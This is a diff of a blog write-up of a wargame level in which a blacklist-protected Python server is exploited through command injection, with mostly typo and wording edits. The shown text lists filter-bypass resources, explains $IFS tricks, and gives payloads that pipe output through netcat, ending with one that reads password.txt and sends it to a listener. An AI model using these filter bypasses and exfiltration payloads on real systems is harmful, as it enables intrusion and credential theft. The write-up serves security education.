@@ -11,7 +11,7 @@ To review the previous levels, check the links below:
 * [Binary Master: Ensign - Level 5](https://livz.github.io/2016/02/09/binary-master-ensign-5.html)
 * [Binary Master: Lieutenant - Level 1](https://livz.github.io/2016/02/16/binary-master-lieutenant-1.html)
 
-Before we began, here's a list of resources containing different tricks to bypass filters meant to prevent command injection:
+Before we begin, here's a list of resources containing different tricks to bypass filters meant to prevent command injection:
 * [OS Command execution](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/os-cmd-execution)
 * [Bypassing bash command injections restrictions](http://thomasforrer.blogspot.co.uk/2014/07/bypassing-bash-command-injections.html)
 * [Command Injection Without Spaces](http://www.betterhacker.com/2016/10/command-injection-without-spaces.html)
@@ -76,13 +76,13 @@ Let's spend a few moments to understand how this program works. Notice that upon
         sys.exit(-1)
 ```
 
-There is also an indication that the application will be chroot-ed to **/chroot**. If we inspect this folder, we can see it's owned by root, with no write permissions for other users. That means we'll have a problem - **the python script will not be able to write anything!**:
+There is also an indication that the application will be chroot-ed to **/chroot**. If we inspect this folder, we can see it's owned by root, with no write permissions for other users. That means we'll have a problem - **the python script will not be able to write anything there**:
 
 ```
 drwxr-xr-x  8 root root  4096 May 12 12:42 chroot
 ```
 
-Inside this folder we have an interesting file, for which the python script **will have** access - _password.txt_:
+Inside this folder we have an interesting file, for which the python script **will have access** - _password.txt_:
 
 ```
 -rw-r-----  1 root level4   18 May 12 12:36 password.txt
@@ -92,7 +92,7 @@ After dealing with permissions, the script starts a TCP server listening on port
 
 ## 1 - Vulnerability
  
-Although having this blacklist might sound like a good idea (definitely better than nothing), in practice most of the times it is a bad idea to filter known-bad input from user. Attackers are usually very creative.
+Although having this blacklist might sound like a good idea (definitely better than nothing), in practice most of the times it is a bad idea to filter known-bad input from the user. Attackers can be very creative.
 
 ## 2 - Exploit
 So let's see what's the problem. We have two issues:
@@ -116,7 +116,7 @@ According to the [documentation](https://docs.python.org/2/library/os.html#os.sy
            execl("/bin/sh", "sh", "-c", command, (char *) 0);
 ```           
 
-The resources refenreced in the beginning usggest that the **$IS** environment variable might be a good place to start. After playing with different combinations locally, I've noticed that it works fine, but whenever $IFS is followd by a number or letter, they together get interpreted a a single variable. My workaround was to define another variable in those cases. 
+The resources refenreced in the beginning suggest that the **$IFS** environment variable might be a good place to start. After playing with different combinations locally, I've noticed that it works fine, but whenever $IFS is followd by a number or letter, they together get interpreted as a single variable. My workaround was to define more variables when needed. 
 
 So let's see how we can introduce a simple delay, which signifies that the command injection was successful:
 
@@ -139,7 +139,7 @@ $  nc -lvvp 2000
 $ MSG=hello&&IP=0&&PORT=2000&&echo$IFS$MSG|nc$IFS-nvv$IFS$IP$IFS$PORT
 ```
 
-Strangely, however, nothing happens. After some thinking, I realised that _nc_ program inside the chroot environment is just a symbolic link. Fortunately, **nc.openbsd** is also present in /chroot/bin:
+Strangely, however, nothing happens. After some thinking, I realised that the _nc_ program inside the chroot environment is just a symbolic link. Fortunately, **nc.openbsd** is also present in /chroot/bin:
 
 ```
 $ ls -alh /chroot/bin/nc
@@ -157,9 +157,9 @@ Let's see if we can get a simple message back:
 
 ## 3 - Profit
 
-We have to read the password stored in password.txt, in the root of the chroot environment:
+We can now read the password stored in password.txt, in the root of the chroot environment:
 
-```
+```bash
 (in the level4 console)
 $ IP=0&&PORT=2000&&cat$IFS/password.txt|nc.openbsd$IFS-nvv$IFS$IP$IFS$PORT
 
